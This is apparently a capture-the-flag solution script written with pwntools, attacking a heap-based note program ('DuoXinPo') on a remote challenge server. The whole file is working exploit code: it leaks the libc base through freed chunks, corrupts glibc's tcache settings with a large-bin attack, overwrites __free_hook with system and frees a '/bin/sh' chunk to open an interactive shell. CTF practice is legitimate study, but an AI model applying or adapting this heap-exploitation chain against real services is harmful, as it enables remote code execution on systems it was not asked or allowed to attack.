from pwn import *

# context.log_level = 'debug'

# p = process('./DuoXinPo')
p = remote('challenges.hazmat.buptmerak.cn', 20136)
# attachment = ELF('./')
libc = ELF('./libc-2.31.so')

def create(id, size, content):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'id.', str(id).encode())
    p.sendlineafter(b'write?', str(size).encode())
    p.sendlineafter(b'begin.', content)

def delete(id):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'delete?', str(id).encode())

def change(id, content):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'change?', str(id).encode())
    p.sendlineafter(b'begin.', content)

def browse(id):
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'see?', str(id).encode())

create(1, 0x500, b'')
create(2, 0x600, b'')
create(3, 0x700, b'')
delete(1)
delete(3)
create(4, 0x700, b'')
browse(1)
p.recvline()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ed010
mp_addr = libc_base + 0x1ec280
free_hook_addr = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
print(hex(libc_base), hex(mp_addr), hex(free_hook_addr), hex(system_addr))

create(40, 0x500, b'')
create(5, 0x700, b'')  # chunk1
create(6, 0x500, b'')
create(7, 0x6f0, b'')  # chunk2
create(8, 0x500, b'')
create(9, 0x500, b'')  # chunk3
create(10, 0x500, b'/bin/sh\x00')
delete(5)
create(11, 0x900, b'')
delete(7)
browse(5)
p.recvline()
fd = u64(p.recv(6).ljust(8, b'\x00'))
change(5, p64(fd) * 2 + p64(mp_addr + 0x50 - 0x20) * 2)
create(41, 0x900, b'')

delete(9)
change(1, p64(0) * 13 + p64(free_hook_addr))
create(12, 0x500, p64(system_addr))
delete(10)
# gdb.attach(p)

p.interactive()